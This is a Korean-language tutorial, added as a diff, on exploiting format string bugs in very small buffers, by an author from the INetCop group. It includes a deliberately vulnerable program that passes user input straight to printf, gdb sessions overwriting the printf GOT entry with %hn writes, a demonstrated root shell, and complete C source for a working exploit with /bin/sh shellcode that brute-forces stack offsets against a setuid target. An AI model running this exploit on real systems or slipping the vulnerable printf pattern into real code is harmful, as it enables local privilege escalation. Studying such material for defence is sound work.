@@ -1,0 +1,583 @@
+
+ =======================================================================================
+  Title: 작은 버퍼에서 format string 공격 하기
+  Author : 유동훈 (Xpl017Elz) in INetCop
+  E-mail : szoahc@hotmail.com
+  Home: http://x82.inetcop.org & http://x82.i21c.net
+ =======================================================================================
+
+  0x00. Overview
+  0x01. Training
+  0x02. Small buffer format string attack
+
+
+  0x00. Overview
+
+
+ format string 공격에 대해서는 이미 많은 문헌이 인터넷상에 공개되어 있습니다.
+ 이번 강좌는 작은 버퍼에서 format string 공격을 할때 이용할 수 있는 방법을 간단히
+ 적어보도록 하겠습니다.
+
+
+  0x01. Training
+
+
+ 다음은 heap 기반 format string 취약점에 노출되어 있는 code입니다.
+ 앞으로 설명드릴 내용을 이해하려면, $-flag format string에 대해 반드시 알아야 합니다.
+
+ --- test1.c ----------------------------------------------------------------------
+ int main(int argc, char *argv[])
+ {
+ 	char *x=(char *)malloc(40);
+ 	strncpy(x,argv[1],40);
+ 	printf(x);
+ 	printf("\n");
+ }
+ ----------------------------------------------------------------------------------
+
+ $ ./vuln %x%x%x
+ 8049770bfffdb68400311eb
+ $
+
+ 0x08049770은 malloc을 통해 선언한 heap 변수 주소입니다.
+ 이 변수에는 방금 제가 입력한 "%x%x%x"가 저장될 것입니다.
+
+ $ gdb -q vuln
+ (gdb) br *main+70
+ Breakpoint 1 at 0x804847e
+ (gdb) r %x%x%x
+ Starting program: /tmp/vuln %x%x%x
+ 8049770bfffdb68400311eb
+
+ Breakpoint 1, 0x804847e in main ()
+ (gdb) x/8 0x08049770
+ 0x8049770:      0x78257825      0x00007825      0x00000000      0x00000000
+ 0x8049780:      0x00000000      0x00000000      0x00000000      0x00000000
+ (gdb)
+
+ 만약, 입력한 값이 heap에 저장된다면 이것을 공략하는 것은 어렵습니다.
+ 그 이유는 format string이 참조할 주소값을 찾을 수 없기 때문입니다.
+
+ 하지만, stack에 방금 공격자가 입력했던 값이 저장된다면, 이야기는 달라집니다.
+ 네, 그렇습니다. stack에는 분명 공격자가 방금 입력한 값이 저장됩니다.
+ (조사해보면 환경변수가 저장되는 앞부분에 적재되어 있는 것을 확인할 수 있습니다.)
+
+ ...
+ 0xbfffdc97:      "i586"
+ 0xbfffdc9c:      "/tmp/vuln"
+ 0xbfffdca6:      "%x%x%x" <- 이 부분.
+ 0xbfffdcad:      "LESSOPEN=|lesspipe.sh  %s"
+ 0xbfffdcc7:      "QT_HANFONT=-*-kodig-medium-r-normal--12-*-ksc5601.1987-0,-*-kodig-medium-r-normal--14-*-ksc5601.1987-0,-*-kodig-medium-r-normal--16-*-ksc5601.1987-0,-*-kodig-medium-r-normal--18-*-ksc5601.1987-0,-*-ko"...
+ (gdb)
+ 0xbfffdd8f:      "dig-medium-r-normal--20-*-ksc5601.1987-0,-*-kodig-medium-r-normal--24-*-ksc5601.1987-0"
+ 0xbfffdde6:      "QT_KEYBOARD=2"
+ 0xbfffddf4:      "HISTSIZE=1000"
+ ...
+
+ "%x%x%x"가 보이시죠? 네, 바로 0xbfffdca6에 저장되는 retloc의 값을 우리는 %8x%8x%8x나,
+ $-flag를 통해 도달할 수 있게 됩니다.
+ 이렇게 해서 변수의 내용이 heap에 저장됨에도 불구하고 exploit을 가능하게 할 수 있습니다.
+ 참조할 주소값의 위치는 다음과 같이 짐작하여 찾을 수 있습니다.
+ 
+ $ ./vuln AAAA%88\$x%89\$x%90\$x
+ AAAA414141412438382539382578
+ $ gdb -q vuln
+ (gdb) disass printf
+ Dump of assembler code for function printf:
+ 0x8048364 <printf>:     jmp    *0x8049510
+ 0x804836a <printf+6>:   push   $0x20
+ 0x804836f <printf+11>:  jmp    0x8048314 <_init+48>
+ End of assembler dump.
+ (gdb)
+
+ gdb에서 testing 하면, 실제 shell의 결과와는 약간 다릅니다.
+ 어쨌든, 다음과 같이 format code를 완성하여 시험할 수 있었습니다.
+
+ $ gdb -q vuln
+ (gdb) r `printf "\x10\x95\x04\x08\x12\x95\x04\x08"`%16697x%91\$hn%00257x%90\$hnAA
+ Starting program: /tmp/vuln `printf "\x10\x95\x04\x08\x12\x95\x04\x08"`%16697x%91\$hn%00257x%90\$hnAA
+
+ ...
+
+ Program received signal SIGSEGV, Segmentation fault.
+ 0x41414242 in ?? ()
+ (gdb)
+
+ %16697x은 0x4141을 값입니다. 이 값을 먼저 0x08049512에 저장하였습니다. 그리고, 
+ %257x (0x4242에서 0x4141를 제외한 값)을 0x08049510에 저장하였습니다.
+ 이렇게 해서 0x41414242 값을 GOT에 저장할 수 있었습니다.
+
+ 앞서, 입력해준 값을 format string이 참조할 수 있도록 우리는 $-flag를 이용했습니다.
+ 그런데 만약, 위의 format string을 입력할 수 없는 아주 작은 버퍼에 format string 취약점이 존재한다면,
+ 어떻게 exploit 할까요?
+
+ 자, 다음으로 넘어갑시다.
+
+
+ 0x02. Small buffer format string attack
+
+
+ 잠깐, format string이 어떻게 주소를 참조하는지 알아봅시다. 이것은 여러분들이 이미 알고있는
+ 단순한 내용일 것입니다.
+
+ int main()
+ {
+        char string[]="It's test!";
+        char format_str[]="\x41\x41\x41\x41%s\n";
+        printf(format_str);
+ }
+
+ 위에 0x41414141에는 "It's test!"가 존재하고 있는 주소값을 넣을 것입니다.
+ gdb로 보면, 문자열이 0x8048470에 있는 것을 확인할 수 있습니다.
+
+ (gdb) x/s 0x8048470
+ 0x8048470 <_IO_stdin_used+4>:    "It's test!"
+ (gdb)
+
+ 그럼 이 주소를 대입해봅시다.
+
+ $ cat > patch
+ --- test.c      Tue Jun  3 20:47:51 2003
+ +++ test.patch.c        Tue Jun  3 20:48:02 2003
+ @@ -1,6 +1,6 @@
+  int main()
+  {
+         char string[]="It's test!";
+ -       char format_str[]="\x41\x41\x41\x41%s\n";
+ +       char format_str[]="\x70\x84\x04\x08%s\n";
+         printf(format_str);
+  }
+ ^C
+ $ patch < patch
+ patching file `test.c'
+ $ gcc -o test test.c && ./test
+ It's test!
+ $
+
+ 자, 예상하던데로 `%s' format string은 0x08048470 주소값의 내용을 참조하여 그 내용을
+ 출력해주었습니다.
+ 이와 같이 format string을 통해 주소값을 참조하게 하거나 변경하기 위해 (%hn or %n),
+ 공격자들은 GOT, .dtors return address등의 덮어쓰고자 하는 주소값을 넣어줍니다.
+
+ 이미 앞에서 시험해보았듯이 공격자가 입력한 값이 우리가 format string을 통해 도달할 수 있는
+ stack상 존재한다면, $-flag나 %8x 따위를 사용하여 공격할 수 있었습니다.
+
+ 네, 그렇습니다.
+
+ 공격자가 덮어쓰고자 하는 위치의 주소값이 stack에 저장되어 있다면 format string 앞에 주소값을
+ 입력하지 않아도 된다는 의미입니다.
+ 즉, 기존에 format string code 앞에 입력했던, GOT, .dtors, return address (짧게는 8byte,
+ 일반적으로는 16byte, 길게는 32byte) 주소 코드는 이제 더 이상 필요하지 않습니다.
+
+ 그렇다면, 공격자가 덮어쓰고자 하는 위치의 주소값을 어느 곳에 어떻게 저장할까요?
+ 가장 쉽게 local에서 접근할 수 있는 방법은 환경변수를 이용하는 방법이 있습니다.
+ 환경 변수를 이용하여 값을 저장하면, $-flag를 통해 stack 상에 저장된 주소를 참조하게 할 수 있습니다.
+
+ 이렇게 되면 공격 시, shellcode 주소를 2번에 나누어 10진수로 변환한 값만 필요로 하게 됩니다.
+ 결국, 30byte 이하의 작은 버퍼 환경에서 format string exploit이 가능하게 됩니다.
+
+ 음... 그리고 또 다른 방법으로 생각할 수 있는 것이 바로, argument 입니다.
+ 만약 argument 0에 format string code를 입력한다면, stack에 저장되는 영역은 환경변수보다 가까운
+ 거리에 존재하기 때문에 매우 작은 버퍼에서 유용하게 exploit을 할 수 있을 것입니다.
+
+ 자, 그럼 먼저 환경변수를 이용한 exploit 해보겠습니다.
+ eggshell을 실행시켜놓은 후,
+
+ # ./eggshell
+
+  Using shellcode address: 0xbffff9a8
+
+ bash# export A=`perl -e 'print "\x10\x95\x04\x08\x12\x95\x04\x08"x20'`
+
+ A라는 환경변수에 GOT address를 저장했습니다.
+
+ bash# gdb -q vuln
+ (gdb) r %49151x%261\$hn%15641x%262\$hn
+ Starting program: /tmp/vuln %49151x%261\$hn%15641x%262\$hn
+
+ ...
+ Program received signal SIGTRAP, Trace/breakpoint trap.
+ 0x40001780 in _start () at rtld.c:142
+ 142     rtld.c: No such file or directory.
+ (gdb) c
+ Continuing.
+ bash# id
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ bash# exit
+ exit
+
+ Program exited normally.
+ (gdb) q
+ bash#
+
+ 역시 예상했던대로 format string만을 버퍼에 집어넣어 shell을 실행할 수 있었습니다. (단, 28byte 소요)
+ 환경변수가 아닌, argument를 통해 exploit 할 경우, 더 작은 버퍼에서도 exploit이 가능합니다.
+
+ bash-2.04# cat test.c
+ main() {
+ 	execl("./vuln","\xb8\x95\x04\x08\xba\x95\x04\x08","%49151x%97$hn%14775x%96$hn",0);
+ }
+ bash-2.04# ./test
+ ...
+                       ...
+                                          ...
+                                                sh-2.04#
+
+ WoW~ argument 0번째에 GOT address code를 삽입하므로써, stack상에 거리가 가까워졌습니다.
+ (%96$x%97$x) 이로 인해 공격할 수 있는 버퍼의 최소 크기는 26byte가 되었습니다.
+
+ 자, 여태까지 증명한대로, 버퍼의 최소 크기 26byte에서 format string exploit이 가능합니다.
+ 만약 remote의 환경이거나 환경변수에 특정 값을 저장하지 못할 경우에는 프로그램에 쓰이는
+ stack을 이용해도 좋습니다. (예를 들면, 사용자의 입력을 요구하는 프로그램)
+
+ 여러분들이 직접 Linux에서 편리하게 exploit할 수 있도록 exploit code를 준비해보았습니다.
+ 하나는 환경변수를 이용하는 방법이고, 또 다른 하나는 argument를 이용하는 방법입니다.
+ 두 방법 다 30byte 이하의 작은 버퍼 환경에서 exploit 할 수 있습니다.
+
+ 실행 예제: --
+
+ [root@xpl017elz /tmp]# chmod 6755 vuln
+ [root@xpl017elz /tmp]# su x82
+ [x82@xpl017elz /tmp]$ ./0x82-sfmt_xpl
+
+  Proof of Concept 26byte small buffer format string exploit.
+
+  [+] GOT (printf) address: 0x8049510
+  [+] Shellcode address: 0xbfffffb7
+  [+] Attack mode: Environment variable.
+  [+] flag and pad brute-force mode:
+  ........................................................................
+  [*] Found it!!!
+  [+] Pad: 3
+  [+] Flag: 72
+  [+] Attack format string: %49151x%73$hn%16312x%72$hn
+  [+] code size: 26byte
+  [*] Input [ENTER]:
+
+      ...
+
+                            8049770
+
+                                                ...
+                  ...
+
+                                 bash#
+
+ --
+ 감사합니다.
+
+
+ -- 별 첨 code --
+
+=========== vuln.c ===========
+/*
+**
+** code 이름: vuln.c
+** 설 명: format string 취약점에 노출된 code.
+**
+*/
+
+int main(int argc, char *argv[])
+{
+	char *x0x=(char *)malloc(26);
+	strncpy(x0x,argv[1],26);
+	printf(x0x);
+	printf("\n");
+}
+
+=========== eoc ==============
+
+====== 0x82-sfmt_xpl.c =======
+/*
+**
+** code 이름: 0x82-sfmt_xpl.c 
+** 설 명: 작은 버퍼(26byte)에서 format string 공격을 시도할 exploit code.
+**
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+
+#define OBJDUMP "/usr/bin/objdump"
+#define GREP "/bin/grep"
+#define AWK "/bin/awk"
+#define TARGET "./vuln"
+#define d_size (0x000000ff)
+#define s_size (sizeof(int)*4)
+#define df_flg (0x0000012c)
+
+int scs=(0);
+int arg=(0);
+int flag=(1);
+int m_pad=(4),pad;
+int jnk_one,jnk_two;
+u_long got,shr;
+char tg_f_nm[(d_size)]=(TARGET);
+char shellcode[]=
+"\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40"
+"\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40"
+"\x90\x40\x90\x40\x90\x40\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
+"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52"
+"\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+
+u_long __get_dtors(char *f_name);
+void __mk_str_code(char *env_arg_atk,char *exec_t,char *got_buf);
+void tl_exploit_f(int fd,char *env_arg_atk,char *exec_t);
+void cpl_usage(char *f_name);
+void banrl();
+
+int main(int argc,char *argv[])
+{
+	int whgl;
+	pid_t pid;
+	struct stat s_t;
+	char exec_t[(d_size)];
+	char env_arg_atk[(d_size)];
+	char got_buf[(s_size)];
+
+	memset((char *)got_buf,0,sizeof(got_buf));
+	memset((char *)env_arg_atk,0,sizeof(env_arg_atk));
+	memset((char *)exec_t,0,sizeof(exec_t));
+
+	(void)banrl();
+	while((whgl=getopt(argc,argv,"M:m:T:t:F:f:P:p:Hh"))!=EOF)
+	{
+		extern char *optarg;
+		switch(whgl)
+		{
+			case 'M':
+			case 'm':
+				if((arg=atoi(optarg))>1)
+				{
+					(void)cpl_usage(argv[0]);
+				}
+				break;
+
+			case 'T':
+			case 't':
+				memset((char *)tg_f_nm,0,sizeof(tg_f_nm));
+				strncpy(tg_f_nm,optarg,sizeof(tg_f_nm)-1);
+				break;
+
+			case 'F':
+			case 'f':
+				if((flag=atoi(optarg))>(df_flg))
+				{
+					fprintf(stderr," [-] $-flag value error.\n\n");
+					exit(-1);
+				}
+				break;
+
+			case 'P':
+			case 'p':
+				m_pad=atoi(optarg);
+				break;
+
+			case 'H':
+			case 'h':
+				(void)cpl_usage(argv[0]);
+				break;
+
+			case '?':
+				(void)cpl_usage(argv[0]);
+				break;
+		}
+	}
+
+	if((stat((tg_f_nm),&s_t)!=0))
+	{
+		fprintf(stderr," [-] target program path: %s not found.\n\n",(tg_f_nm));
+		exit(-1);
+	}
+	got=(__get_dtors(tg_f_nm));
+	shr=((0xbfffffff)-(strlen(shellcode)));
+	if((!got))
+	{
+		fprintf(stdout," [-] GOT (printf) address getting failed.\n\n");
+		exit(-1);
+	}
+
+	fprintf(stdout," [+] GOT (printf) address: %p\n",got);
+	fprintf(stdout," [+] Shellcode address: %p\n",shr);
+	fprintf(stdout," [+] Attack mode: %s.\n", (arg)?"Argument":"Environment variable");
+
+	got_buf[0]=got_buf[4]=(got&0x000000ff)>>0;
+	got_buf[1]=got_buf[5]=(got&0x0000ff00)>>8;
+	got_buf[2]=got_buf[6]=(got&0x00ff0000)>>16;
+	got_buf[3]=got_buf[7]=(got&0xff000000)>>24;
+	got_buf[4]+=(0x2);
+	jnk_one=((shr&0xffff0000)>>16);
+	jnk_two=((shr&0x0000ffff)>>0)-(jnk_one);
+
+	fprintf(stdout," [+] flag and pad brute-force mode:\n ");
+	for(;flag<=(df_flg);flag++)
+	{
+		fprintf(stdout,".");
+		fflush(stdout);
+		for(pad=0;pad<=(m_pad);pad++)
+		{
+			int out[2],in[2];
+			(void)__mk_str_code(env_arg_atk,exec_t,got_buf);
+			if(pipe(out)==-1)
+			{
+				perror(" [-] pipe (out) error");
+				exit(-1);
+			}
+			if(pipe(in)==-1)
+			{
+				perror(" [-] pipe (in) error");
+				exit(-1);
+			}
+			switch(pid=fork())
+			{
+				case -1:
+					perror(" [-] fork() error");
+					break;
+
+				case 0:
+					close(out[0]);
+					close(in[1]);
+					dup2(out[1],STDOUT_FILENO);
+					dup2(in[0],STDIN_FILENO);
+					{
+						char *test_emt[3];
+						if(!arg)
+						{
+							test_emt[0]=(env_arg_atk);
+							test_emt[1]=(shellcode);
+							test_emt[2]=(NULL);
+							execle(tg_f_nm,tg_f_nm,exec_t,NULL,test_emt);
+						}
+						else
+						{
+							test_emt[0]=(shellcode);
+							test_emt[1]=(NULL);
+							execle(tg_f_nm,env_arg_atk,exec_t,NULL,test_emt);
+						}
+					}
+					break;
+
+				default:
+					close(out[1]);
+					close(in[0]);
+					(void)tl_exploit_f(out[0],env_arg_atk,exec_t);
+					close(out[0]);
+					close(in[1]);
+					break;
+			}
+			wait(&pid);
+		}
+	}
+	if(!scs)
+	{
+		fprintf(stdout,"\n [-] Sorry, GOT address not found.\n\n");
+		exit(-1);
+	}
+}
+
+u_long __get_dtors(char *f_name)
+{
+	char st_exec[(d_size)*2];
+	FILE *fp;
+	char fd_addr[(s_size)];
+
+	memset((char *)st_exec,0,sizeof(st_exec));
+	snprintf(st_exec,sizeof(st_exec)-1,
+		// objdump -R ./vuln | grep printf
+		"%s -R %s"
+		" | %s printf"
+		" | %s -F\" \""
+		" '{print $1}'",
+		(OBJDUMP),f_name,(GREP),(AWK));
+	if((fp=(FILE *)popen(st_exec,"r"))==NULL)
+	{
+		perror(" [-] popen() error");
+		exit(-1);
+	}
+	memset((char *)fd_addr,0,sizeof(fd_addr));
+	fgets(fd_addr,sizeof(fd_addr)-1,fp);
+	pclose(fp);
+
+	return(strtoul(fd_addr,NULL,sizeof(fd_addr)));
+}
+
+void __mk_str_code(char *env_arg_atk,char *exec_t,char *got_buf)
+{
+	char pad_t[(s_size)];
+	int cl_pad=(pad);
+	memset((char *)pad_t,0,sizeof(pad_t));
+
+	while(cl_pad)
+	{
+		cl_pad--;
+		pad_t[cl_pad]='+';
+	}
+	memset((char *)env_arg_atk,0,(d_size));
+	snprintf(env_arg_atk,(d_size)-1,"%s%s",got_buf,pad_t);
+	memset((char *)exec_t,0,(d_size));
+	snprintf(exec_t,(d_size)-1,"0000000%%%d$xx0000000%%%d$xx",flag,flag+1);
+}
+
+void tl_exploit_f(int fd,char *env_arg_atk,char *exec_t)
+{
+	char *r_emt[3];
+	char rslt[(d_size)];
+	char rslt_buf[(d_size)];
+	memset((char *)rslt,0,sizeof(rslt));
+	memset((char *)rslt_buf,0,sizeof(rslt_buf));
+
+	read(fd,rslt,sizeof(rslt)-1);
+	snprintf(rslt_buf,sizeof(rslt_buf)-1,"0000000%xx0000000%xx",got,got+2);
+
+	if(strstr(rslt,rslt_buf))
+	{
+		scs+=(1);
+		fprintf(stdout,"\n [*] Found it!!!\n");
+		fprintf(stdout," [+] Pad: %d\n",pad);
+		fprintf(stdout," [+] Flag: %d\n",flag);
+		memset((char *)exec_t,0,(d_size));
+		snprintf(exec_t,(d_size)-1,"%%%dx%%%d$hn%%%dx%%%d$hn",jnk_one,flag+1,jnk_two,flag);
+		fprintf(stdout," [+] Attack format string: %s\n",exec_t);
+		fprintf(stdout," [+] code size: %dbyte\n",strlen(exec_t));
+		fprintf(stdout," [*] Input [ENTER]: ");
+		fflush(stdout);
+		getchar();
+
+		if(!arg)
+		{
+			r_emt[0]=(env_arg_atk);
+			r_emt[1]=(shellcode);
+			r_emt[2]=(NULL);
+			execle(tg_f_nm,tg_f_nm,exec_t,NULL,r_emt);
+		}
+		else
+		{
+			r_emt[0]=(shellcode);
+			r_emt[1]=(NULL);
+			execle(tg_f_nm,env_arg_atk,exec_t,NULL,r_emt);
+		}
+	}
+}
+
+void cpl_usage(char *f_name)
+{
+	fprintf(stdout," Usage: %s -option argument\n\n",f_name);
+	fprintf(stdout,"\t -m [target num]    : Select exploit mode. (default: %d)\n",arg);
+	fprintf(stdout,"\t\t\t{0} : Environment variable.\n");
+	fprintf(stdout,"\t\t\t{1} : Argument.\n");
+	fprintf(stdout,"\t -t [target path]   : target program path. (default: %s)\n",tg_f_nm);
+	fprintf(stdout,"\t -f [flag num]      : $-flag number. (default: %d)\n",flag);
+	fprintf(stdout,"\t -p [pad num]       : max pad number. (default: %d)\n",m_pad);
+	fprintf(stdout,"\t -h                 : help information.\n\n");
+	fprintf(stdout," Example: %s -t%s -m%d\n\n",f_name,tg_f_nm,arg);
+	exit(-1);
+}
+
+void banrl()
+{
+	fprintf(stdout,"\n Proof of Concept 26byte small buffer format string exploit.\n\n");
+}
+
+=========== eoc ==============
